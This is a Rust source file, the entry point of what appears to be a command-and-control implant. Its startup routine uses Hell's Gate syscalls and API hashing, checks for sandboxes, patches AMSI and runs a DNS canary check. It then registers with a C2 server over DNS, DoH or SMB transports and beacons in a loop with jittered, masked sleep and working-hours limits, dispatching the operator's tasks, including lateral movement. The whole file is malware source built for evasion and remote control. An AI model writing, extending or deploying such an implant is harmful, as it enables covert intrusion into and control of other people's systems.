#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}
mod crypto;
mod transport;
mod transport_dns;
mod transport_doh;
#[cfg(target_os = "windows")]
mod transport_smb;
#[cfg(target_os = "windows")]
mod hells_gate;
#[cfg(target_os = "windows")]
mod api_hash;
mod commands;
#[cfg(target_os = "windows")]
mod evasion;
#[cfg(target_os = "windows")]
mod dotnet;
#[cfg(target_os = "windows")]
mod bof;
mod lateral;

use std::thread;
use std::time::Duration;
use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};

fn sleep_ms() -> u64 {
    use std::sync::atomic::Ordering;
    let base = {
        let s = DYN_SLEEP_SEC.load(Ordering::Relaxed);
        if s == u64::MAX { config::SLEEP_SEC } else { s }
    } * 1000;
    let pct = {
        let j = DYN_JITTER_PCT.load(Ordering::Relaxed);
        if j == u64::MAX { config::JITTER_PCT } else { j }
    };
    if pct == 0 { return base; }
    let jit = (base * pct / 100) as i64;
    let mut r = [0u8; 8];
    crypto::random_bytes(&mut r);
    let delta = (i64::from_le_bytes(r).abs() % (jit * 2 + 1)) - jit;
    (base as i64 + delta).max(1000) as u64
}

fn main() {
    // Child process mode for DOTNET_EXEC fork-and-run.
    #[cfg(target_os = "windows")]
    {
        if std::env::var("__ENDGAME_CLR_CHILD").is_ok() {
            crate::dotnet::clr_child_run();
            std::process::exit(0);
        }
    }

    #[cfg(target_os = "windows")]
    {
        hells_gate::init();
        api_hash::init();
        evasion::sandbox_check();
        evasion::patch_amsi();
        if !config::CANARY_DOMAIN.is_empty() {
            evasion::dns_canary_check(config::CANARY_DOMAIN);
        }
    }

    let mut t = transport::AgentTransport::new();

    // Registration loop — retry every 30 s until success
    loop {
        if t.register() { break; }
        thread::sleep(Duration::from_secs(30));
    }

    // Beacon loop
    loop {
        #[cfg(target_os = "windows")]
        {
            if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
                evasion::sleep_masked(60_000);
                continue;
            }
        }

        let tasks = t.beacon();
        for task in tasks {
            commands::dispatch(&mut t, &task);
        }

        #[cfg(target_os = "windows")]
        evasion::sleep_masked(sleep_ms());
        #[cfg(not(target_os = "windows"))]
        thread::sleep(Duration::from_millis(sleep_ms()));
    }
}
